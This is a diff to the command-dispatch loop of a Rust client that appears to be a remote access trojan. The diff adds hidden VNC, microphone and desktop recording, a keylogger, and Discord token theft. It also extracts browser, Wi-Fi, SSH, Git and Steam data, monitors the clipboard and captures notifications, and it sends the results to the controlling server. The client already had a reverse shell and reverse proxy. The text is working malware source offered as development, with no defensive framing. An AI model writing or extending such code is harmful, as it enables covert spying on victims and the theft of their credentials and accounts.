@@ -1,10 +1,31 @@
 use crate::features::other::{visit_website, show_messagebox, elevate_client, system_commands, handle_input_command};
 use crate::features::collectors::client_info;
 use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
+use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
+use crate::features::mic::{send_mic_device_list, start_mic_live, stop_mic_live, start_mic_recording, stop_mic_recording};
+use crate::features::desktop_recording::{start_desktop_recording, stop_desktop_recording};
+use crate::features::desktop_audio::{start_remote_desktop_audio, stop_remote_desktop_audio, start_hvnc_audio, stop_hvnc_audio};
+use crate::features::discord::send_discord_tokens;
+use crate::features::extraction::{
+    collect_git_data,
+    collect_software_inventory,
+    collect_steam_data,
+    collect_wifi_data,
+    collect_ssh_data,
+    start_clipboard_monitor,
+    stop_clipboard_monitor,
+    start_notification_capture,
+    stop_notification_capture,
+    launch_software_by_name,
+    uninstall_software_by_name,
+    get_software_icon_by_name,
+};
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::fun::execute_troll_command;
 use crate::features::webcam::take_webcam;
-// use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
+use crate::features::keylogger::{start_keylogger, stop_keylogger, send_offline_logs, clear_offline_logs};
+use crate::features::browser::get_browser_data;
+//use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
 use rand_chacha::ChaCha20Rng;
 use tokio::sync::oneshot;
@@ -49,9 +70,15 @@ pub async fn reading_loop(
                 }
             }
 
-            Ok(Some(ClientboundPacket::ScreenshotDisplay(display))) => take_screenshot(display).await,
+            Ok(Some(ClientboundPacket::ScreenshotDisplay(display))) => {
+                tokio::spawn(take_screenshot(display));
+            }
 
-            Ok(Some(ClientboundPacket::GetProcessList)) => { let _ = send_packet(ServerboundPacket::ProcessList(process_list())).await; }
+            Ok(Some(ClientboundPacket::GetProcessList)) => {
+                tokio::spawn(async move {
+                    let _ = send_packet(ServerboundPacket::ProcessList(process_list())).await;
+                });
+            }
 
             Ok(Some(ClientboundPacket::KillProcess(process))) => kill_process(process.pid),
 
@@ -96,6 +123,33 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::StopRemoteDesktop)) => stop_remote_desktop(),
 
+            Ok(Some(ClientboundPacket::StartRemoteDesktopAudio)) => start_remote_desktop_audio(),
+
+            Ok(Some(ClientboundPacket::StopRemoteDesktopAudio)) => stop_remote_desktop_audio(),
+
+            Ok(Some(ClientboundPacket::StartHVNC)) => start_hvnc(),
+
+            Ok(Some(ClientboundPacket::StopHVNC)) => stop_hvnc(),
+
+            Ok(Some(ClientboundPacket::StartHVNCFrameAudio)) => start_hvnc_audio(),
+
+            Ok(Some(ClientboundPacket::StopHVNCFrameAudio)) => stop_hvnc_audio(),
+
+            Ok(Some(ClientboundPacket::OpenExplorer)) => open_process("explorer.exe".to_string()),
+
+            Ok(Some(ClientboundPacket::OpenHVNCProcess(process_name))) => open_process(process_name),
+
+            Ok(Some(ClientboundPacket::StartMicLive(device_id))) => start_mic_live(device_id),
+            Ok(Some(ClientboundPacket::StopMicLive)) => stop_mic_live(),
+            Ok(Some(ClientboundPacket::StartMicRecording(device_id))) => start_mic_recording(device_id),
+            Ok(Some(ClientboundPacket::StopMicRecording)) => stop_mic_recording().await,
+            Ok(Some(ClientboundPacket::RequestMicDevices)) => {
+                tokio::spawn(send_mic_device_list());
+            }
+            Ok(Some(ClientboundPacket::RequestDiscordTokens)) => send_discord_tokens(),
+            Ok(Some(ClientboundPacket::StartDesktopRecording(config))) => start_desktop_recording(config),
+            Ok(Some(ClientboundPacket::StopDesktopRecording)) => stop_desktop_recording(),
+
             Ok(Some(ClientboundPacket::MouseClick(click_data))) => mouse_click(click_data),
 
             Ok(Some(ClientboundPacket::KeyboardInput(input_data))) => keyboard_input(input_data),
@@ -110,7 +164,9 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::StopReverseProxy)) => reverse_proxy.stop().await,
 
-            Ok(Some(ClientboundPacket::RequestWebcam)) => take_webcam().await,
+            Ok(Some(ClientboundPacket::RequestWebcam)) => {
+                tokio::spawn(take_webcam());
+            }
             
             // Ok(Some(ClientboundPacket::StartHVNC)) => start_hvnc(),
             
@@ -126,6 +182,89 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::TrollClient(command))) => execute_troll_command(&command),
 
+            Ok(Some(ClientboundPacket::StartKeylogger(realtime))) => start_keylogger(realtime),
+
+            Ok(Some(ClientboundPacket::StopKeylogger)) => stop_keylogger(),
+
+            Ok(Some(ClientboundPacket::GetOfflineLogs)) => {
+                tokio::spawn(send_offline_logs());
+            }
+
+            Ok(Some(ClientboundPacket::ClearOfflineLogs)) => clear_offline_logs(),
+
+            Ok(Some(ClientboundPacket::GetBrowserData)) => {
+                tokio::spawn(async move {
+                    let data = get_browser_data();
+                    let _ = send_packet(ServerboundPacket::BrowserData(data)).await;
+                });
+            }
+
+            Ok(Some(ClientboundPacket::GetWifiData)) => {
+                tokio::spawn(async move {
+                    let data = collect_wifi_data();
+                    let _ = send_packet(ServerboundPacket::WifiData(data)).await;
+                });
+            }
+
+            Ok(Some(ClientboundPacket::GetSoftwareInventory)) => {
+                tokio::spawn(async move {
+                    let data = collect_software_inventory();
+                    let _ = send_packet(ServerboundPacket::SoftwareInventory(data)).await;
+                });
+            }
+
+            Ok(Some(ClientboundPacket::LaunchSoftware(name))) => {
+                let result = launch_software_by_name(&name);
+                let _ = send_packet(ServerboundPacket::SoftwareActionResult(result)).await;
+            }
+
+            Ok(Some(ClientboundPacket::UninstallSoftware(name))) => {
+                let result = uninstall_software_by_name(&name);
+                let _ = send_packet(ServerboundPacket::SoftwareActionResult(result)).await;
+            }
+
+            Ok(Some(ClientboundPacket::GetSoftwareIcon(name))) => {
+                let result = get_software_icon_by_name(&name);
+                let _ = send_packet(ServerboundPacket::SoftwareIconResult(result)).await;
+            }
+
+            Ok(Some(ClientboundPacket::GetGitData)) => {
+                tokio::spawn(async move {
+                    let data = collect_git_data();
+                    let _ = send_packet(ServerboundPacket::GitData(data)).await;
+                });
+            }
+
+            Ok(Some(ClientboundPacket::GetSSHData)) => {
+                tokio::spawn(async move {
+                    let data = collect_ssh_data();
+                    let _ = send_packet(ServerboundPacket::SSHData(data)).await;
+                });
+            }
+
+            Ok(Some(ClientboundPacket::GetSteamData)) => {
+                tokio::spawn(async move {
+                    let data = collect_steam_data();
+                    let _ = send_packet(ServerboundPacket::SteamData(data)).await;
+                });
+            }
+
+            Ok(Some(ClientboundPacket::StartClipboardMonitor)) => {
+                start_clipboard_monitor();
+            }
+
+            Ok(Some(ClientboundPacket::StopClipboardMonitor)) => {
+                stop_clipboard_monitor();
+            }
+
+            Ok(Some(ClientboundPacket::StartNotificationCapture)) => {
+                start_notification_capture();
+            }
+
+            Ok(Some(ClientboundPacket::StopNotificationCapture)) => {
+                stop_notification_capture();
+            }
+
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
             }
@@ -135,6 +274,7 @@ pub async fn reading_loop(
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
                 stop_remote_desktop();
+                stop_keylogger();
                 // stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
@@ -145,6 +285,7 @@ pub async fn reading_loop(
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
                 stop_remote_desktop();
+                stop_keylogger();
                 // stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
@@ -161,7 +302,7 @@ pub async fn writing_loop(
     secret: Option<Vec<u8>>,
     mut nonce_generator: Option<ChaCha20Rng>,
 ) {
-    let (packet_tx, mut packet_rx) = mpsc::channel::<ServerboundPacket>(32);
+    let (packet_tx, mut packet_rx) = mpsc::channel::<ServerboundPacket>(1024);
     
     {
         let mut sender = PACKET_SENDER.lock().unwrap();
@@ -193,6 +334,19 @@ pub async fn writing_loop(
 fn clear_packet_sender() {
     let mut sender = PACKET_SENDER.lock().unwrap();
     *sender = None;
+}
+
+pub fn send_packet_sync(packet: ServerboundPacket) -> Result<(), String> {
+    let sender_opt = {
+        let sender_guard = PACKET_SENDER.lock().unwrap();
+        sender_guard.clone()
+    };
+
+    if let Some(sender) = sender_opt {
+        return sender.blocking_send(packet).map_err(|e| e.to_string());
+    }
+
+    Err("Packet sender not initialized".to_string())
 }
 
 pub async fn send_packet(packet: ServerboundPacket) -> Result<(), String> {
